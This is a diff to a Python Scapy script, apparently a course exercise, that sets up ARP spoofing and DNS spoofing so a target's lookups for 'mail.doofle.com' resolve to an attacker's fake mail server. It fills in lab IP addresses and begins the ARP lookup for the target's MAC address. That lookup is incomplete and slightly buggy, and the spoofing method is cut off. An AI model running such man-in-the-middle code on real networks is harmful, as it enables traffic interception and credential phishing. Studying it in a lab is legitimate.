@@ -5,18 +5,18 @@ from scapy.layers.dns import DNS, DNSQR, DNSRR, IP, sr1, UDP
 import scapy.all as scapy
 import time
 
-DOOFENSHMIRTZ_IP = "???"  # Enter the computer you attack's IP.
-SECRATERY_IP = "???"  # Enter the attacker's IP.
-NETWORK_DNS_SERVER_IP = "???"  # Enter the network's DNS server's IP.
+DOOFENSHMIRTZ_IP = "10.0.2.15"  # Enter the computer you attack's IP.
+SECRATERY_IP = "10.0.2.5"  # Enter the attacker's IP.
+NETWORK_DNS_SERVER_IP = "10.0.2.43"  # TODO Enter the network's DNS server's IP.
 SPOOF_SLEEP_TIME = 2
 
-IFACE = "???"  # Enter the network interface you work on.
+IFACE = "???"  # TODO Enter the network interface you work on.
 
 FAKE_GMAIL_IP = SECRATERY_IP  # The ip on which we run
 DNS_FILTER = f"udp port 53 and ip src {DOOFENSHMIRTZ_IP} and ip dst {NETWORK_DNS_SERVER_IP}"  # Scapy filter
 REAL_DNS_SERVER_IP = "8.8.8.8"  # The server we use to get real DNS responses.
 SPOOF_DICT = {  # This dictionary tells us which host names our DNS server needs to fake, and which ips should it give.
-    b"???": FAKE_GMAIL_IP
+    b"mail.doofle.com": FAKE_GMAIL_IP
 }
 
 
@@ -49,7 +49,12 @@ class ArpSpoofer(object):
         If not initialized yet, sends an ARP request to the target and waits for a response.
         @return the mac address of the target.
         """
-        pass
+        arp_to_send = scapy.ARP(pdst=DOOFENSHMIRTZ_IP)
+        ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+        packet = ether/arp_to_send
+        result = srp(packet,timeout=3,verbose=0)[0]
+        for sent,received in result:
+            print("IP = " + str(received) + "  , mac is " +  str(sent))
 
     def spoof(self) -> None:
         """
